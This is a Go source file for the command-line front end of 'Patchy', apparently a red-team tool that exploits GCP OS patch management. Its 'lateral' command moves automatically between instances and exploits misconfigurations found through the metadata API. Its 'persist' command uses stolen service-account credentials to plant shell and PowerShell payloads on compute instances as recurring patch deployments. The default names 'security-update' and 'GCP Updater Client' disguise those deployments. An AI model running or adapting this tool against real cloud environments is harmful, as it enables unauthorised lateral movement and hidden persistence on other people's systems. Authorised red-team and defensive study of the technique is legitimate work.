package main

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"os"

	"github.com/rek7/patchy/pkg/engine"
	"github.com/spf13/cobra"
)

var (
	rootCmd = &cobra.Command{
		Use:   "patchy",
		Short: "Patchy - GCP OS Patch Management Exploitation",
		Long: `Patchy is a GCP exploitation tool designed for red teaming engagements.
   
Based on https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching`,
		Run: func(cmd *cobra.Command, args []string) {
			if len(args) == 0 {
				cmd.Help()
				os.Exit(0)
			}
		},
	}

	lateralCmd = &cobra.Command{
		Use:     "lateral",
		Aliases: []string{"lat"},
		Short:   "Performs automatic lateral movement within a GCP environment",
		Long: `Performs automatic lateral movement within a GCP environment
	
NOTE: You must be in a GCP env with the metadata API available.`,
		Run: func(cmd *cobra.Command, args []string) {
			// dont check for errors, this will always exist due it being required
			bucketName, _ := cmd.Flags().GetString("bucket")
			winScript, _ := cmd.Flags().GetString("wpayload")
			patchName, _ := cmd.Flags().GetString("pname")
			linScript, _ := cmd.Flags().GetString("lpayload")
			isPersist, _ := cmd.Flags().GetBool("persist")
			desc, _ := cmd.Flags().GetString("pdesc")
			ctx := context.Background()
			e, err := engine.NewEngine(bucketName, patchName, desc, winScript, linScript, isPersist, ctx)
			if err != nil {
				log.Fatalf("issue creating new engine: %v", err)
			}

			isExploit, _ := cmd.Flags().GetBool("exploit")
			err = e.FindMisconfigurations(isExploit)
			if err != nil {
				log.Fatalf("issue finding misconfigs in lateral movement: %v", err)
			}

		},
	}

	persistCmd = &cobra.Command{
		Use:     "persist",
		Aliases: []string{"per"},
		Short:   "Enables persistence on compute instances owned by service account",
		Long: `Installs persistence across compute instances for a service account with valid credentials.
	
NOTE: The service account must have editor privileges or osconfig.patchDeployments.create permissions.`,
		Run: func(cmd *cobra.Command, args []string) {
			bucketName, _ := cmd.Flags().GetString("bucket")
			winScript, _ := cmd.Flags().GetString("wpayload")
			patchName, _ := cmd.Flags().GetString("pname")
			linScript, _ := cmd.Flags().GetString("lpayload")
			desc, _ := cmd.Flags().GetString("pdesc")
			ctx := context.Background()
			e, err := engine.NewEngine(bucketName, patchName, desc, winScript, linScript, true, ctx)
			if err != nil {
				log.Fatalf("issue creating new engine: %v", err)
			}

			creds, _ := cmd.Flags().GetString("creds")
			err = e.ExploitServiceAccountCredFile(creds)
			if err != nil {
				log.Fatalf("issue finding misconfigs in lateral movement: %v", err)
			}

		},
	}
	//go:embed ascii_art.txt
	banner string
)

func init() {
	rootCmd.PersistentFlags().StringP("bucket", "b", "", "bucket name hosting payload")
	rootCmd.PersistentFlags().StringP("lpayload", "l", "payload.bash", "name of linux shell payload")
	rootCmd.PersistentFlags().StringP("wpayload", "w", "payload.ps1", "name of windows powershell payload")
	rootCmd.PersistentFlags().BoolP("persist", "p", false, "enable persistence (patch deployment) (default false)")
	rootCmd.PersistentFlags().StringP("pname", "n", "security-update", "name of patch deployment/job")
	rootCmd.PersistentFlags().StringP("pdesc", "d", "GCP Updater Client", "patch deployment/job description")
	rootCmd.MarkPersistentFlagRequired("bucket")

	lateralCmd.Flags().BoolP("exploit", "e", false, "exploit if misconfiguration is found (default false)")
	rootCmd.AddCommand(lateralCmd)

	persistCmd.Flags().StringP("creds", "c", "", "path to JSON credential file")
	persistCmd.MarkFlagRequired("creds")
	rootCmd.AddCommand(persistCmd)
}

func main() {
	fmt.Println(banner)
	if err := rootCmd.Execute(); err != nil {
		log.Fatalf("Issue starting cmd: %v", err)
	}
}
